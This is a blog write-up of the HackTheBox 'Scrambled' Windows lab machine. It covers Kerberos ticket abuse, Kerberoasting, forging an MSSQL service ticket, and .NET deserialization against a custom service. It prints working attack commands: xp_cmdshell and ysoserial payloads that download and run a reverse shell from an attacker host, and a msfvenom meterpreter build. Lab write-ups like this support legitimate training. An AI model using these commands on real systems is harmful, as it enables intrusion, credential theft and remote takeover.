---
layout: post
title: HackTheBox - Scrambled
category: HackTheBox
tags: machines windows ad mssql reverse-engineering kerberos
date: 2022-10-01 18:31 +0300
---

![Machine logo](/assets/hackthebox/scrambled/Scrambled.png){:height="420px" width="620px"}

# Configuration

If you're using your own machine like me, you have to access HTB network via `OpenVPN`:

```zsh
sudo openvpn lab_access_file.ovpn
```

You have to be accurate here, you must understand that your machine is becoming accessable for other users in the VPN network. So you have to protect yourself by setting up a strong password and turning off unused services on your machine. Make sure you have a strong system and others can't harm you.

It is very useful to append `/etc/hosts/` with ip address of the machine. It is useful to get subdomains and to not memorize the address every time.

```zsh
$ echo "10.10.11.168\tscrambled.htb" | sudo tee -a /etc/hosts
10.10.11.168    scrambled.htb
```

# Reconnaissance

## Port scan

We start with a port scan. I've decided to remove the masscan because of its problems with infinity wait after the work is done. So the script is changed and now executes only nmap. 

```bash
#!/bin/bash

if [[ $# != 1 ]]
then
    echo -e "\e[0;31m[!]\e[0m Not specified a host or incorrect use."
    exit 1
fi

ports=$(nmap -p- --min-rate=500 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A $1
```

```bash
$ fnmap 10.10.11.168
$ cat nmap_scan         
# Nmap 7.92 scan initiated Mon Sep 26 12:12:19 2022 as: nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49675,49676,49699,49703,60700 -A -oN nmap_scan 10.10.11.168
Nmap scan report for 10.10.11.168
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-26 12:12:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-26T12:15:40+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-26T12:15:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-09-25T22:57:23
|_Not valid after:  2052-09-25T22:57:23
|_ssl-date: 2022-09-26T12:15:40+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-26T12:15:40+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-26T12:15:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
60700/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.92%I=7%D=9/26%Time=6331972A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-26T12:15:03
|_  start_date: N/A
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

It is an `Active Directory` (AD) domain, so the machine is Windows Server. There are also a `web server` on port 80, `SMB` server on port 445, `MSSQL` server on port 1433 and some strange application on port 4411. Let's start by enumerating a web application.

It can be useful to append domain and domain controller addresses to /etc/hosts

> 10.10.11.168    scrambled.htb scrm.local dc1.scrm.local

## Foothold

![Web application](/assets/hackthebox/scrambled/web.png)

There are `Home` and `IT Services` pages available. There is nothing interesting in Home page. In IT Services page we can see that `NTLM` authentication is disabled on the domain.

![NTLM is disabled](/assets/hackthebox/scrambled/NTLM_disabled.png)

Also, we can see some `Resources` pages. They are very interesting for us. On the `Contacting IT support` page we can see a screenshot of `ksimpson` user desktop. We can note a domain username from it.

![ksimpson username](/assets/hackthebox/scrambled/ksimpson_username.png)

On `Sales Orders App Troubleshooting` page we can see some custom application is here, but we can not find it from this step.

![Sales order client](/assets/hackthebox/scrambled/sales_order_client.png)

On `Password Resets` page we can note that when the user wants to reset his password. It is becoming to be same as the username.

![Password reset policy](/assets/hackthebox/scrambled/password_policy.png)

# user.txt

## Use Kerberos authentication

We've noted that NTLM is disabled on the domain, so we have to use Kerberos authentication. Kerberos is based on the tickets. But to request these tickets we have to specify the username and the password. The most useful tools are made in `impacket scripts`.

Let's suppose that the ksimpson user has the same password as its username. To request a ticket we have to use `getTGT.py` impacket script. To use it we have to export it in our environment variable `KRB5CCNAME`.

```bash
$ getTGT.py scrm.local/ksimpson:ksimpson        
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in ksimpson.ccache

$ export KRB5CCNAME=ksimpson.ccache
```

## Kerberoasting attack

Our next step is to perform some basic checks like `Kerberoasting` on the user we've found. Kerberoasting can be performed to harvest `Ticket Granting Service` (TGS) tickets for services that run on behalf of user accounts in the AD. In AD every service has its own User Account. So, when we request a TGS, it is encrypted with the service password and we can crack it offline.

We will use `GetUserSPNs.py` impacket script here. We have to specify that we want to user Kerberos authentication with `-k`, `-no-pass` flags. Also, if something would be found here, we specify a `request` flag to get services hashes.

```bash
GetUserSPNs.py scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local -no-pass -request
```

![Kerberoasting attack](/assets/hackthebox/scrambled/kerberoasting.png)

We've got a `Kerberos 5, etype 23, TGS-REP` hash here. It is associated with the user `sqlsvc`, which is running `MSSQL` server. We can crack it with `JohnTheRipper` tool.

```bash
john --wordlist=~/tools/rockyou.txt sqlsvc_hash
```
![sqlsvc password](/assets/hackthebox/scrambled/sqlsvc_hash.png)

## Reverse shell with MSSQL

Our next step is to connect to the MSSQL. But we have to generate a ticket for the service, we can use impacket's `ticketer.py` script. But we have to get a Domain SID to do it. And there is impacket again with `getPac.py` script.

```bash
getPac.py -targetUser sqlsvc scrm.local/sqlsvc:<sqlsvc password>
```

![Domain SID](/assets/hackthebox/scrambled/domain_sid.png)

Now we can get a TGS to MSSQL server as a sqlsvc user. We nedd a NTLM hash and domain SID to generate it.

```bash
ticketer.py -spn MSSQLSvc/dc1.scrm.local -nthash <sqlsvc NTLM hash> -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local sqlsvc
export KRB5CCNAME=sqlsvc.ccache
```

Now we can connect to the MSSQL server. We will use impacket's `mssqlclient.py` here.

```bash
mssqlclient.py scrm.local/sqlsvc@dc1.scrm.local -no-pass -k
```

![MSSQLclient.py](/assets/hackthebox/scrambled/mssqlclient.png)

It is designed to get a `Remote Code Execution` (RCE) on the server. So our next step is to get a reverse shell. I've made a payload in .ps1 file on my local machine. So the reverse shell will be downloaded from my machine and executed. I've chosen a PowerShell #3 (Base64) payload from [Reverse Shell Generator](https://www.revshells.com/). We have to save it to file.

```bash
enable_xp_cmdshell
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<IP>:<PORT>/shell.ps1\")
```

![Got sqlsvc reverse shell](/assets/hackthebox/scrambled/got_sqlsvc.png)

## Dump MSSQL database

The sqlsvc hasn't got a user.txt flag, so we have to enumerate other user. We can dump the MSSQL datavase with [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL) script. We can upload it on the machine with PowerShell's `wget`, it is an alias for `Invoke-WebRequest` command. We have to specify the address and the output file here.

```powershell
wget -Uri "http://<IP>:<PORT>/PowerUpSQL.ps1" -OutFile PowerUpSQL.ps1
```
It is a very powerful tool, you can use the [cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) to get some useful commands.

Our next step is to import the tool and dump some info about the databases. We can do it with `Invoke-SQLDumpInfo` cmdlet.

```powershell
Invoke-SQLDumpInfo -Verbose -Instance DC1
```

It will give a big output in a csv format. Our scope is databases and their tables here. The databases info is stored in `<COMPUTER NAME>_Databases.csv` file.

![DC1 Databases info](/assets/hackthebox/scrambled/databases_info.png)

The database is `ScrambleHR`. Let's see the tables and their columns. They are located in `<COMPUTER NAME>_Database_columns.csv` file.

![Tables and columns](/assets/hackthebox/scrambled/tables_columns.png)

The most interesting here is `UserImport` table with possible credentials in. We can dump the table with `Get-SQLQuery` cmdlet.

```powershell
Get-SQLQuery -Verbose -Instance DC1 -Query "SELECT * FROM ScrambleHR.dbo.UserImport"
```

![miscsvc credentials](/assets/hackthebox/scrambled/miscsvc_credentials.png)

And we've got some credentials. Now we can authenticate as `miscsvc` user in our powershell session. I did a reverse shell as miscsvc user here.

```powershell
$password = ConvertTo-SecureString "<miscsvc password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("scrm.local\miscsvc", $password)
$sess = New-PSSession -Credential $cred -ComputerName DC1
Invoke-Command -Session $sess -ScriptBlock {powershell -e <Base64 encoded payload>}
```

![Got user!](/assets/hackthebox/scrambled/got_user.png)

But I've decided to get more cool Metasploit `meterpreter` shell. So I made an executable with `msfvenom` tool and setted up a listener in msfconsole.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o meterpreter.exe
msfconsole -q
set payload windows/x64/meterpreter/reverse_tcp
set lhost <IP>
set lport <PORT>
run -j
```

Then, I've downloaded and executed it as miscsvc user.

```powershell
wget -Uri "http://<IP>:<PORT>/meterpreter.exe" -OutFile meterpreter.exe
./meterpreter.exe
```

# root.txt

## Explore the machine

At first we upload [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) to get some info about the machine. With that we can explore that the `ScrambleServer` service is running on port 4411.

![ScrambleServer](/assets/hackthebox/scrambled/ScrambleCorpServer.png)

Then, in the `Shares` directory we can find a `ScrambleClient` executable. We have to download it and explore on the local machine.

![ScrambleClient](/assets/hackthebox/scrambled/scramblecorpclient.png)

```bash
cd "C:\Shares\IT\Apps\Sales Order Client"
download *
```

## Explore the ScrambleCorp client application

We can check the file is a `.NET` application. So, we have to open it on our local Windows machine. Also, as we know the application is talking with a server on port, we have to connect to HackTheBox VPN on our Windows machine.

![ScrambleClient application](/assets/hackthebox/scrambled/application.png)

We do not know the username and the password. So our next step is to disassemble the application. We can do it with [dnSpy](https://github.com/dnSpy/dnSpy) tool. We have to import the application and its DLL file.

The `ScrambleLib.dll` is a library which performs requests to a server. In the `Logon` function we can find a bypass method. If we take the `scrmdev` username we will be able to bypass the login.

![Developer logon bypass](/assets/hackthebox/scrambled/developer_bypass.png)

So, let's get the login. Also, do not forget to enable debug logging in the `Edit` tab.

![Scramble client](/assets/hackthebox/scrambled/scrambleclient.png)

There are some orders, also we can paste a new order. We have to do it and then leave the application to check its logs. The scope of our interests is uploading the order. And we can find it in the logs.

![Upload order](/assets/hackthebox/scrambled/upload_order.png)

The application formats the data with `Binary formatter` and encodes it with `Base64`. Then it sends it to the server with `UPLOAD_ORDER;<payload>` command.

## .NET deserialization attack

As we have seen, the application sends the data in serialized binary base64 format. So, the application performs deserialization on its side. We explored that the application is running as a service on the machine, which means it has `NT AUTHORITY\SYSTEM` rights on the machine.

We can abuse it by performing a `.NET deserialization attack`. The author of the machine has a [blog post](https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/) about this attack. We need a [ysoserial.net](https://github.com/pwntester/ysoserial.net) tool. You can learn how to use it on its GitHub page and on [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization#ysoserial.net)

I haven't had an easy access to Windows machine, so I decided to upload this zip archived tool directly on the machine with our meterpreter shell. In Windows cmd, we can unzip the files with `tar.exe` tool.

```bash
upload ysoserial-1.35.zip
shell
```

```cmd
tar -xf ysoserial-1.35.zip
```

Our next step is to generate a payload for this application. We know that it is converting a .NET binary in base64 and sends it to the application. I've used a `WindowsIdentity` gadget here. We specify here to execute powershell, download a reverse shell script from our machine and execute it. A choosed the same reverse shell payload as before here.

```cmd
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell.exe Invoke-Command -Computer dc1 -ScriptBlock {IEX(New-Object Net.WebClient).downloadString('http://<IP>:<PORT>/shell.ps1')}"
```

Then, we have set up a listener, copy the payload and pass it in the application with `UPLOAD_ORDER;` string.

```bash
$ nc dc1.scrm.local 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;<payload>
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.
```

The last line here indicates that the payload is deserialized and executed, because it has thrown an exception. The application did not recognized the "right" data here.

And we can check on our machine, the reverse shell gained. 

![Got root!](/assets/hackthebox/scrambled/rooted.png)

The box is Pwn3d!

![Pwn3d!](/assets/hackthebox/scrambled/pwn3d.png){:height="420px" width="620px"}

# Conclusion

I've spent a lot of time to figure out how to use impacket correctly 😂. It was cool to learn more about Kerberos authentication and .NET deserialization. I've enjoyed the box a lot!

Thank you for reading, I hope it was useful for you ❤️
